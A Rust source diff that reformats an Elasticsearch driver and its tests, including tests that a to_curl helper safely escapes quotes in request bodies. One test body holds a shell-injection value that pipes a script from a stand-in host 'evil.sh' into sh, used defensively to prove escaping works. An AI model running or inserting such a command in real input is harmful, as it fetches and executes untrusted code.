@@ -29,7 +29,11 @@ pub fn parse_query(query: &str) -> Option<(String, String, Option<String>)> {
     }
     let body = lines.collect::<Vec<_>>().join("\n");
     let body = body.trim();
-    let body = if body.is_empty() { None } else { Some(body.to_string()) };
+    let body = if body.is_empty() {
+        None
+    } else {
+        Some(body.to_string())
+    };
     Some((method, path, body))
 }
 
@@ -61,7 +65,10 @@ impl Driver for ElasticsearchDriver {
     async fn connect(&mut self) -> anyhow::Result<()> {
         let response = reqwest::get(format!("{}/", self.base_url)).await?;
         if !response.status().is_success() {
-            anyhow::bail!("elasticsearch ping failed with status {}", response.status());
+            anyhow::bail!(
+                "elasticsearch ping failed with status {}",
+                response.status()
+            );
         }
         Ok(())
     }
@@ -75,7 +82,9 @@ impl Driver for ElasticsearchDriver {
                 entry
                     .get("index")
                     .and_then(|v| v.as_str())
-                    .map(|name| SchemaInfo { name: name.to_string() })
+                    .map(|name| SchemaInfo {
+                        name: name.to_string(),
+                    })
             })
             .collect())
     }
@@ -90,7 +99,9 @@ impl Driver for ElasticsearchDriver {
         let client = reqwest::Client::new();
         let mut request = client.request(method, &url);
         if let Some(body) = &body {
-            request = request.header("Content-Type", "application/json").body(body.clone());
+            request = request
+                .header("Content-Type", "application/json")
+                .body(body.clone());
         }
         let response = request.send().await?;
         // Most Elasticsearch APIs return JSON, but the `_cat` family (e.g.
@@ -175,7 +186,10 @@ mod tests {
         match result {
             QueryResult::Documents(docs) => {
                 assert_eq!(docs.len(), 1);
-                assert!(docs[0].is_string(), "expected a plain-text string, got: {docs:?}");
+                assert!(
+                    docs[0].is_string(),
+                    "expected a plain-text string, got: {docs:?}"
+                );
                 assert!(
                     docs[0].as_str().unwrap().contains("health"),
                     "expected the _cat/indices header row, got: {docs:?}"
@@ -236,7 +250,11 @@ mod tests {
     #[test]
     fn to_curl_escapes_single_quotes_in_the_body_so_the_shell_command_is_safe() {
         let body = r#"{"query": "'; curl evil.sh | sh; '"}"#;
-        let curl = to_curl("http://localhost:9200", &format!("POST my-index/_search\n{body}")).unwrap();
+        let curl = to_curl(
+            "http://localhost:9200",
+            &format!("POST my-index/_search\n{body}"),
+        )
+        .unwrap();
 
         // Every `'` in the body must be replaced with the close-quote /
         // escaped-literal-quote / reopen-quote sequence `'\''`, so the body
@@ -253,7 +271,11 @@ mod tests {
     #[test]
     fn to_curl_escaped_body_round_trips_through_a_real_shell() {
         let body = r#"{"query": "'; touch /tmp/tradar-to-curl-test-should-not-exist; '"}"#;
-        let curl = to_curl("http://localhost:9200", &format!("POST my-index/_search\n{body}")).unwrap();
+        let curl = to_curl(
+            "http://localhost:9200",
+            &format!("POST my-index/_search\n{body}"),
+        )
+        .unwrap();
 
         // Run the generated command through a real shell, replacing `curl`
         // with `echo` so nothing actually hits the network, and assert the
@@ -261,7 +283,11 @@ mod tests {
         // single argument — proving the embedded `'; ...; '` never breaks
         // out of the quoted string.
         let script = curl.replacen("curl", "echo", 1);
-        let output = std::process::Command::new("sh").arg("-c").arg(&script).output().unwrap();
+        let output = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(&script)
+            .output()
+            .unwrap();
         let stdout = String::from_utf8_lossy(&output.stdout);
 
         assert!(
